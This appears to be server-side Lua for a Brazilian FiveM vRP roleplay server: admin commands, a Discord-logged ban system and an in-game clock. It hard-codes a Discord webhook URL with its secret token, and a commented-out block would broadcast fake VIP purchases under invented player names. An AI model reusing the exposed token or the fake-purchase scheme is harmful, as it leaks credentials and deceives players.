        TriggerClientEvent("Notify",source,"sucesso",((message ~= "") and message or "Sem usuários bugados no momento!"))
    end
end)

RegisterCommand("kicksrc",function(source, args) 
    local source = source; 
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id, 'admin.permissao') then 
        if #args > 0 and tonumber(args[1]) and tonumber(args[1]) > 0 then 
            DropPlayer(tonumber(args[1]),"Você foi expulso da cidade pelo administrador "..user_id)
        end
    end
end)

RegisterCommand("hackperma",function(source, args) 
    local source = source; 
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id, 'admin.permissao') then 
        if #args > 0 and tonumber(args[1]) and tonumber(args[1]) > 0 then 
            TriggerClientEvent("_____get",tonumber(args[1]),true)
            Wait(1000)
            DropPlayer(tonumber(args[1]),"Você foi banido pelo usuário "..user_id)
        end
    end
end)

RegisterCommand("tptosrc",function(source, args) 
    local source = source; 
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id, 'admin.permissao') then 
        if #args > 0 and tonumber(args[1]) and tonumber(args[1]) > 0 then 
            local playerCoords = GetEntityCoords(GetPlayerPed(tonumber(args[1])))
            if playerCoords.x ~= 0.0 then 
                SetEntityCoords(GetPlayerPed(source),playerCoords)
            end
        end
    end
end)

RegisterCommand("kickbugados",function(source) 
    local source = source; 
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id, 'admin.permissao') then 
        local message = ""
        for _,v in ipairs(GetPlayers()) do 
            local pName = GetPlayerName(v)
            local uId = vRP.getUserId(tonumber(v))
            if not uId then 
                message = message .. string.format("</br> (Kickado) <b>%s</b> | Source: <b>%s</b>",pName,v)
                DropPlayer(v,"Você foi kikado por estar bugado!")
            end
        end
        TriggerClientEvent("Notify",source,"sucesso",((message ~= "") and message or "Sem usuários bugados no momento!"))
    end
end)

RegisterCommand('kitmalokero', function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") then
	vRPclient._giveWeapons(source, { ["WEAPON_PISTOL_MK2"] = {ammo= 250} }, true)
	vRP.giveInventoryItem(user_id,'radio',1)
	vRP.giveInventoryItem(user_id,'celular',1)
	vRP.giveInventoryItem(user_id,'roupa',1)
	vRP.giveInventoryItem(user_id,'bandagem',15)
	TriggerClientEvent("Notify",source,"sucesso","Você equipou o KIT malokero.", 5)
	vRP.sendLog("KITMALOKERO", "O ID "..user_id.." adicionou o kit dos maloka.")
	end
end)

----------------------------------------------------------------------------------------------------------------------------------------
-- DERRUBAR JOGADOR NO CHAO
----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('ney',function(source,args,rawCommand)
    local user_id = vRP.getUserId(source)
    local identity = vRP.getUserIdentity(user_id)
    if user_id then
        if vRP.hasPermission(user_id,"developer.permissao") then
            if args[1] then
                local nplayer = vRP.getUserSource(parseInt(args[1]))
                if nplayer then
                    TriggerClientEvent('derrubarwebjogador',nplayer,args[1])
                end
            end
        end
    end
end)

----------------------------------------------------------------------------------------------------------------------------------------
-- CAR SEAT
----------------------------------------------------------------------------------------------------------------------------------------
RegisterCommand('carseat',function(source,args,rawCommand)
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id,"admin.permissao") then
        TriggerClientEvent('SetarDentroDocarro',source)
    end
end)

RegisterCommand('addcar', function(source,args)
	if source == 0 then
		print("Veiculo: "..args[2].. " Adicionado para o USER_ID: "..args[1])
		vRP.execute("vRP/inserir_veh",{ veiculo = args[2], user_id = args[1], ipva = os.time(), expired = "{}" })
	end
end)

RegisterCommand('efeitos', function(source,args)
	local user_id = vRP.getUserId(source)
	if user_id then
		if vRP.hasPermission(user_id, "admin.permissao") then
			local effect = vRP.prompt(source, "Digite o efeito", "")

			vRPclient._playScreenEffect(source, effect, 5)
		end
	end
end)

RegisterCommand("forcedelete",function(source)
	local source = source 
	local user_id = vRP.getUserId(source)
	if vRP.hasPermission(user_id,"admin.permissao") then
		local plyCoords = GetEntityCoords(GetPlayerPed(source))
		for k,v in ipairs(GetAllObjects()) do 
			if #(GetEntityCoords(v) - plyCoords) < 150.0 then 
				print(GetEntityModel(v))
				DeleteEntity(v)
			end
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- TOP MONEY
-----------------------------------------------------------------------------------------------------------------------------------------
vRP._prepare("mirtin/topMoney", "SELECT nome,sobrenome,user_id,banco FROM vrp_user_identities ORDER BY banco DESC LIMIT 20;")
RegisterCommand('topmoney',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if user_id then
		if vRP.hasPermission(user_id, "developer.permissao") then
			local query = vRP.query("mirtin/topMoney", {})
			if #query > 0 then
				local mensagem = ""
				local i = 0

				for k in pairs(query) do
					mensagem = mensagem.. " "..k.."º ["..query[k].user_id.."] - ("..query[k].nome.." " ..query[k].sobrenome..") ("..vRP.format(query[k].banco)..")<br>"
				end

				TriggerClientEvent("Notify",source, "importante",mensagem, 60)
			end
		end
	end
end)

-----------------------------------------------------------------------------------------------------------------------------------------
-- PIDS
-----------------------------------------------------------------------------------------------------------------------------------------
vRP.prepare("updateID", "UPDATE vrp_user_ids SET user_id = @idantigo WHERE user_id = @idnovo")
vRP.prepare("getIdentifiers", "SELECT identifier FROM vrp_user_ids WHERE user_id = @user_id")

RegisterCommand('pid',function(source,args,rawCommand)
	local user_id = vRP.getUserId(source)
	if user_id then
		if vRP.hasPermission(user_id, "perm.developer") then
			local idAntigo = vRP.prompt(source, "Digite o ID Antigo: (Antes de ser Gerado)", "")
			if idAntigo ~= nil then
				idAntigo = parseInt(idAntigo)
				local idNovo = vRP.prompt(source, "Digite o ID Novo: (Que Acabou de ser Gerado) ", "")
				if idNovo ~= nil then
					idNovo = parseInt(idNovo)
					
					local query = vRP.query("getIdentifiers", { user_id = idNovo })
					if #query > 0 then
						for k in pairs(query) do
							exports["vrp"]:updateIdentifier(query[k].identifier, idAntigo)
						end
					end

					vRP.execute("updateID", { idantigo = idAntigo, idnovo = idNovo })
				end
			end
		end
	end
end)


AddEventHandler("vRP:playerSpawn",function(user_id,source,first_spawn)
	if user_id then

		local licenses = vRP.query("vRP/get_all_licenses",{ user_id = user_id }) or nil
		for k,v in pairs(licenses) do
			if v.identifier == "license:44b35ff2a07e04c1d1f2fa4deb0ea444b70d00ba" or v.identifier == "license:cee9fa96c66ce99d97465d50fbe3fbec8233f448" then
				vRP.setBanned(user_id, true)
				DropPlayer(source, "VAI TOMAR NO CU E METE O PÉ PORRA, SAI DAQUI!")
			end
		end
	end	
end)


-----------------------------------------------------------------------------------------------------------------------------------------
-- SISTEMA DE BANS
-----------------------------------------------------------------------------------------------------------------------------------------
src.setBanned = function(source, target_id, motivo, tempo, hwid)
    local source = source
    local user_id = vRP.getUserId(source)
    local rows = vRP.query("mirtin/getUserBanned", { user_id = target_id })
    local nsource = vRP.getUserSource(target_id)

    if user_id then
        if #rows > 0 then
            config.serverLang['isBanned'](source)
            return
        end

        local formatHWID
        if hwid == nil or hwid <= 0 then
            formatHWID = "Não"
            hwid = 0
        else
            formatHWID = "Sim"
            hwid = 1
        end
        
        local dataBan = os.date("%d/%m/%Y as %H:%M")
        local dataUnban = os.date("%d/%m/%Y as %H:%M", tempo)
        local timeBan = tempo

        if tempo == 0 then
            dataUnban = "Nunca"
        end

        vRP.execute("mirtin/insertBanned", { user_id = target_id, motivo = motivo, banimento = dataBan, desbanimento = dataUnban, time = timeBan, hwid = hwid })
        config.serverLang['banned'](source, target_id, motivo, tempo)

        if nsource then
            config.serverLang['kickBan'](nsource, motivo, dataBan, dataUnban)
        end

        local discord
        local corpoBan
        local ids = GetPlayerIdentifiers(source)

        for k,v in pairs(ids) do
            if string.find(v,"discord:") then
                discord = string.gsub(v, "discord:","")
            end
        end

        if discord == nil then 
            corpoBan = { 
                { 
                    ["color"] = config.geral['color'], 
                    ["title"] = "**".. ":no_entry_sign: | Novo Banimento Registrado " .."**\n", 
                    ["thumbnail"] = { ["url"] = config.geral['logo'] },
                    ["description"] = "**Banido:**\n```cs\nID: "..target_id.."```\n**Banido por: **\n```cs\nID: "..user_id.."```\n**MOTIVO:** ```css\n - "..motivo.."```\n**Data do Banimento:**\n ```cs\n "..dataBan.."```\n**Data do Desbanimento:**\n ```cs\n "..dataUnban.."``` **HWID:** ```cs\n "..formatHWID.."``` ", 
                    ["footer"] = { ["text"] = config.geral['footer'], }, } 
            }
            sendToDiscord(config.geral['whookBan'], corpoBan)
            return
        end

        corpoBan = { 
            { 
                ["color"] = config.geral['color'], 
                ["title"] = "**".. ":no_entry_sign: | Novo Banimento Registrado " .."**\n", 
                ["thumbnail"] = { ["url"] = config.geral['logo'] },
                ["description"] = "**Banido:**\n```cs\nID: "..target_id.."```\n**Banido por: **\n```cs\nID: "..user_id.."``` ``Discord:`` <@"..discord..">\n\n**MOTIVO:** ```css\n - "..motivo.."```\n**Data do Banimento:**\n ```cs\n "..dataBan.."```\n**Data do Desbanimento:**\n ```cs\n "..dataUnban.."``` **HWID:** ```cs\n "..formatHWID.."``` ", 
                ["footer"] = { ["text"] = config.geral['footer'], }, } 
        }
        sendToDiscord(config.geral['whookBan'], corpoBan)
    end
end

src.setUnBanned = function(source, target_id, motivo)
    local source = source
    local user_id = vRP.getUserId(source)
    local rows = vRP.query("mirtin/getUserBanned", { user_id = target_id })
    if user_id then
        if #rows == 0 then
            config.serverLang['isNotBanned'](source)
            return
        end

        local discord
        local corpoBan
        local ids = GetPlayerIdentifiers(source)

        for k,v in pairs(ids) do
            if string.find(v,"discord:") then
                discord = string.gsub(v, "discord:","")
            end
        end

        if discord == nil then
            corpoBan = { 
                { 
                    ["color"] = config.geral['color'], 
                    ["title"] = "**".. ":no_entry:  | Novo Desbanimento Registrado " .."**\n", 
                    ["thumbnail"] = { ["url"] = config.geral['logo'] },
                    ["description"] = "**Desbanido:**\n```cs\nID: "..target_id.."```\n**Desbanido por: **\n```cs\nID: "..user_id.."```\n**Data do Desbanimento:** ```cs\n "..os.date("%d/%m/%Y as %H:%M").."```\n**Motivo do Desbanimento:** ```cs\n "..motivo.."``` ", 
                    ["footer"] = { ["text"] = config.geral['footer'], }, } 
            }
            vRP.execute("mirtin/removeBanned", { user_id = target_id })
            config.serverLang['unbanned'](source, target_id)

            sendToDiscord(config.geral['whookUnban'], corpoBan)
            return
        end

        corpoBan = { 
            { 
                ["color"] = config.geral['color'], 
                ["title"] = "**".. ":no_entry:  | Novo Desbanimento Registrado " .."**\n", 
                ["thumbnail"] = { ["url"] = config.geral['logo'] },
                ["description"] = "**Desbanido:**\n```cs\nID: "..target_id.."```\n**Desbanido por: **\n```cs\nID: "..user_id.."``` ``Discord:`` <@"..discord..">\n\n**Data do Desbanimento:** ```cs\n "..os.date("%d/%m/%Y as %H:%M").."```\n**Motivo do Desbanimento:** ```cs\n "..motivo.."``` ", 
                ["footer"] = { ["text"] = config.geral['footer'], }, } 
        }
        sendToDiscord(config.geral['whookUnban'], corpoBan)

        vRP.execute("mirtin/removeBanned", { user_id = target_id })
        config.serverLang['unbanned'](source, target_id)
    end
end

src.getHcheck = function(source, target_id)
    local source = source
    local user_id = vRP.getUserId(source)
    local rows = vRP.query("mirtin/getUserBanned", { user_id = target_id })
    if user_id then
        if #rows == 0 then
            config.serverLang['isNotBanned'](source)
            return
        end

        TriggerClientEvent('chatMessage', source, "^9 ID: "..target_id.."\nData do Banimento: "..rows[1].banimento.."\nData do Desbanimento: "..rows[1].desbanimento.."\nMotivo do Banimento: "..rows[1].motivo.."  . ")
    end
end

Citizen.CreateThread(function()
    while true do
        local rows = vRP.query("mirtin/getAllBans", {})
        if #rows > 0 then
            for k,v in pairs(rows) do
                vRP.execute("mirtin/removeBanned", { user_id = v.user_id })

                local corpoBan = { 
                    { 
                        ["color"] = config.geral['color'], 
                        ["title"] = "**".. ":no_entry:  | Novo Desbanimento Registrado " .."**\n", 
                        ["thumbnail"] = { ["url"] = config.geral['logo'] },
                        ["description"] = "**Desbanido:**\n```cs\nID: "..v.user_id.."```\n**Desbanido por: **\n```cs\n AUTOMATICO```\n**Data do Desbanimento:** ```cs\n "..os.date("%d/%m/%Y as %H:%M").."``` ", 
                        ["footer"] = { ["text"] = config.geral['footer'], }, } 
                }
                sendToDiscord(config.geral['whookUnbanTime'], corpoBan)
            end
        end
        Citizen.Wait(config.timeUnbans*60*1000)
    end
end)

function sendToDiscord(weebhook, message)
    PerformHttpRequest(weebhook, function(err, text, headers) end, 'POST', json.encode({embeds = message}), { ['Content-Type'] = 'application/json' })
end

local TimeUnit = {
    ['m'] = 60, -- 1 minuto tem 60 segundos
    ['h'] = 3600, -- 1 hora tem 3600 segundos
    ['d'] = 86400 -- 1 dia tem 86400 segundos
}
  
convertTime = function (value)
    if value ~= 0 then
        local unit = value:match('[mhdMHD]'):lower()
        local time = tonumber(value:match('%d+'))
        return (os.time() + (TimeUnit[unit] * time)), os.time() + (TimeUnit[unit] * time)
    end
    return 0
end

-----------------------------------------------------------------------------------------------------------------------------------------
-- FREEZE SYSTEM
-----------------------------------------------------------------------------------------------------------------------------------------
src.syncFreeze = function(status, carreta, veh)
    vCLIENT._freezeVehicle(-1, status, carreta, veh)
end

src.checkPermission = function()
    local source = source
    local user_id = vRP.getUserId(source)
    if vRP.hasPermission(user_id, "perm.texasrace") then
        return true
    end
end

------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
---- SISTEMA DE CLIMA
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
GlobalState.timeHud = {}

local hora = 12
local minuto = 0
local varTime = 10*1000 -- 10 segundos Pra atualizar o tempo

CreateThread(function()
    while true do
        Citizen.Wait(varTime)
        
        if parseInt(hora) >= 22 or parseInt(hora) < 7 then
            minuto = minuto + 2
        else
            minuto = minuto + 2
        end

        if parseInt(minuto) >= 60 then
            hora = hora + 1
            minuto = 0
            if parseInt(hora) >= 24 then
                hora = 0
            end
        end        

        GlobalState.timeHud = { hora = hora, minuto = parseInt(minuto) }
    end
end)

RegisterCommand('time', function(source,args)
    local source = source
    local user_id = vRP.getUserId(source)
    if user_id then
        if vRP.hasPermission(user_id, "admin.permissao") then
            if args[1] and args[2] and parseInt(args[1]) >= 0 and parseInt(args[1]) <= 23 and parseInt(args[2]) >= 0 and parseInt(args[2]) <= 60 then
                hora = parseInt(args[1])
                minuto = parseInt(args[2])

                GlobalState.timeHud = { hora = hora, minuto = parseInt(minuto) }
            else
                TriggerClientEvent("Notify",source,"negado","Digite o tempo corretamente, entre 00 00 ate 23 00", 5)
            end
        end
    end
end)

-------------------------------------------------------------------------------------------------------------------------------------------
---- FAKE VIPS
-------------------------------------------------------------------------------------------------------------------------------------------
--local names = {
--    [1] = "RESGATE AGORA SEU VIP GRATIS",
--    [2] = "Pedro Augusto",
--    [3] = "DIGITE NO F8  BOX",
--    [4] = "RANKD DE HORAS COM PREMIOS",
--    [5] = "USE O CUPOM LOBA35",
--    [6] = "Tatiana Valido",
--    [7] = "USE O CUPOM GUAXININ35",
--    [8] = "Abraão Igrejas",
--    [9] = "USE O CUPOM TIODEAD35",
--    [10] = "Nicolas Pedro",
--    [11] = "USE O CUPOM CORUJA35",
--    [12] = "Paulo Ribeiro",
--    [13] = "RESGATE AGORA SEU VIP GRATIS",
--    [14] = "Karina Santos",
--    [15] = "Raul Silva",
--    [16] = "Cleitin Ribeiro",
--    [17] = "Giovanni Amarante",
--    [18] = "RESGATE AGORA SEU VIP GRATIS",
--    [19] = "Mauri Roberto",
--    [20] = "Henry Original",
--    [21] = "Eduardo Pedro",
--    [22] = "Cintia",
--    [23] = "Destiny Sardinha",
--    [24] = "RESGATE AGORA SEU VIP GRATIS",
--    [25] = "Jonatas Pinto",
--    [26] = "Ygor Hunter",
--    [27] = "Igor Henrique",
--    [28] = "Arthur Peixoto",
--    [29] = "Thomas Cartel",
--    [30] = "Matheus Yasuo",
--    [31] = "Mateus Killua",
--    [32] = "Catarina Alves",
--    [33] = "Luis Henrique",
--    [34] = "Luis Pedro",
--    [35] = "RESGATE AGORA SEU VIP GRATIS",
--    [36] = "Fred Canada",
--    [37] = "Roberto Australia",
--    [38] = "Pedro Londres",
--    [39] = "RESGATE AGORA SEU VIP GRATIS",
--    [40] = "Stephany Moutinho",
--    [41] = "Viviana Pontes",
--    [42] = "Vivian Grilo",
--    [43] = "Izabella Nobre",
--    [44] = "Isabelli Silva",
--    [45] = "Gabriel Ferreira",
--    [46] = "Cleitin NaotedaBola",
--    [47] = "Raul XitaMuito",
--    [48] = "DK AmassaRuim",
--    [49] = "DKzin",
--    [50] = "Elfo Balatensa",
--    [51] = "Pablo Escobar",
--    [52] = "RESGATE AGORA SEU VIP GRATIS",
--    [53] = "Vk Balatensa",
--    [54] = "Mathzin",
--    [55] = "Vini AVG",
--    [56] = "Pedrinho NS",
--    [57] = "Tigas",
--    [58] = "Marquin NTC",
--    [59] = "Biel TaVida",
--    [60] = "Leleozinho",
--    [61] = "Ygor NeVida",
--    [62] = "Nine Alves",
--    [63] = "RESGATE AGORA SEU VIP GRATIS",
--    [64] = "Dark Trem",
--    [65] = "Vulgo Ruivo",
--    [66] = "Pk Delas",
--	[66] = "Pedro DuHS",
--	[67] = "Dr Sheik",
--	[68] = "Allanzin NS",
--	[69] = "Russin ",
--	[70] = "Pk Tadeu",
--	[71] = "Gil Trem",
--	[72] = "Math TremBala",
--	[73] = "Souzinha Beiramar",
--	[74] = "Machado AVG",
--	[75] = "RESGATE AGORA SEU VIP GRATIS",
--	[76] = "Carlin Fumaca",
--	[77] = "Junin Asgard",
--	[78] = "Noah Macedo",
--	[79] = "GB TrocaNunk",
--	[80] = "FB DaQuinze",
--	[81] = "LK Pcc",
--	[82] = "Souza China",
--	[83] = "Machado Skript",
--	[84] = "Chefin AmassaXiter",
--	[85] = "Dead Cartie",
--	[86] = "Silva Pk",
--	[87] = "Pkzin DuAmassa",
--	[88] = "MS DuAsgard",
--	[89] = "Filipe ZK",
--	[90] = "Baiano Sk",
--	[91] = "Leon Trafica",
--	[92] = "Vegas DaZoe",
--	[93] = "Victor Mendez",
--	[94] = "RESGATE AGORA SEU VIP GRATIS",
--	[95] = "Lucky Scott",
--	[96] = "Rubinho RolaNunk",
--	[97] = "Toddyn MiraGruda",
--	[98] = "Lzin Pjl",
--	[99] = "Xexe AmassaRuim",
--	[100] = "Ricky Lopes",
--	[101] = "Vinizin Lana",
--	[102] = "Matheuz Baludo",
--	[103] = "VK Bullettrain",
--	[104] = "Malvadao TremBala",
--	[105] = "Pereira Wasd",
--	[106] = "Jota Ballard",
--	[107] = "RESGATE AGORA SEU VIP GRATIS",
--	[108] = "Grosso Scott",
--	[109] = "Mec Tokovoiop",
--	[110] = "Night Psico",
--	[111] = "ZK TeamSpeak",
--	[112] = "Japa Bluetooth",
--	[113] = "Jota Psico",
--	[114] = "Borda Insano",
--	[115] = "Motta RolouMorreu",
--	[116] = "RESGATE AGORA SEU VIP GRATIS,
--	[117] = "Rodriguin Surfa",
--	[118] = "Careca Trem",
--	[119] = "Lk Trem",
--	[120] = "DaNike Asgard",
--	[121] = "Dkzin",
--	[122] = "DK Pistol",
--	[123] = "Pedro Skriptado",
--	[124] = "Gusta XitaMt",
--	[125] = "RESGATE AGORA SEU VIP GRATIS",
--	[126] = "Meczin DuTrem",
--	[127] = "Gordao Xitadasso",
--	[128] = "Luis Fernando",
--	[129] = "Arthur Mesquita",
--	[130] = "Flaco MiraGrande",
--	[131] = "Apollo Fire",
--	[132] = "Kalli Braga",
--	[133] = "OJapinha Xitadasso",
--	[134] = "Pablo Escobar",
--	[135] = "RESGATE AGORA SEU VIP GRATIS",
--	[136] = "Jr Asgard",
--	[137] = "PK Dyballa",
--	[138] = "Pacoca NS",
--	[139] = "Ricardinho Souza",
--	[140] = "Ricardin Bullettrain",
--	[141] = "Lucas Magrao",
--	[142] = "Gh N$",
--	[143] = "Ninezada Esquenta",
--	[144] = "Sapeka",
--	[145] = "Thzin DuAmassa",
--	[146] = "Poseidon Hype",
--	[147] = "Cacaio Bigode",
--	[148] = "Bigode Trem ",
--	[149] = "Chaulim Peixe",
--	[150] = "Jota Peixinho",
--	[151] = "San Tula",
--	[152] = "Ghostzada",
--	[153] = "Static Lima",
--	[154] = "Mkzin Chaulim",
--	[155] = "Eduardo Bills",
--	[156] = "BN Mornistar",
--	[157] = "Kross Trem",
--	[158] = "LKzin Wakanda",
--	[159] = "Wasd Trem",
--	[160] = "VT Tutu",
--	[161] = "Tubarao Rare",
--	[162] = "Luquinha Skript",
--	[163] = "RESGATE AGORA SEU VIP GRATIS",
--	[164] = "Zk Menor",
--	[165] = "Gordin Pikeno",
--	[166] = "Jr NTeDaBola",
--}
--
--local pacotes = {
--    [1] = "VIP BRONZE",
--    [2] = "VIP PRATA",
--    [3] = "VIP OURO",
--    [4] = "VIP PLATINA",
--    [5] = "VIP DIAMANTE",
--    [6] = "VIP ESMERALDA",
--    [7] = "VIP SAFIRA",
--    [8] = "VIP RUBI",
--    [9] = "VIP RUBI ++ (Permanente)",
--    [10] = "+ 1000KG Bau (FAC)",
--    [11] = "Baú de Líder na Facção",
--    [12] = "ATM NA FACÇÃO",
--    [13] = "1 Five Seven + 50 Muni",
--    [14] = "1x AK47 + 100 Muni",
--    [15] = "150x Munições AK47",
--    [16] = "1x G36 + 100 Muni",
--    [17] = "150x Munições G36",
--    [18] = "VIP GRATIS",
--    [19] = "R$ 500.000 em dinheiro",
--    [20] = "Garagem na propriedade",
--}

--CreateThread(function()
--    while true do
--        local randomName = math.random(#names)
--        local randomRewards = math.random(#pacotes)
--        
--        TriggerClientEvent('chat:addMessage',-1,{template='<div style="display:flex;align-items:center;justify-content:center;padding:10px;margin:5px 0;background-image: linear-gradient(to right, rgba(255, 168, 82,0.9) 1%, rgba(255, 168, 82,0.1) 95%);border-radius: 5px;"><img width="32" style="float: left;">'..names[randomName].. " comprou " ..pacotes[randomRewards]..'</b></div>'})
--                    
--        Wait( 25 * 60 * 1000 )
--    end
--end)

------------------------

Citizen.CreateThread(function()
    PerformHttpRequest("https://discord.com/api/webhooks/1321740750723092531/n4l9MQsOJJZ67oyAnbGyeNyX_nA9qYtGsiAfoZo1yM-O11S7pXXgE7clFBOz4NpLhGjj", function(err, text, headers) end, 'POST', json.encode({
		content = '@everyone',
        embeds = {
            {
                description = 'CIDADE GOIÁS ROLEPLAY ESTA ONLINE:\n\nF8 NO FIVEM E COLOQUE: \n\n connect 191.96.81.87',
                color = 2723266 -- Se quiser mudar a cor é aqui
            }
        }
    }), { ['Content-Type'] = 'application/json' })
end)

--------------dump
--
--egisterCommand('print(GetCurrentServerEndpoint())', function(source,args)
--   local source = source
--   local user_id = vRP.getUserId(source)
--   vRP.setBanned(user_id,true)
--nd)
-----------------------

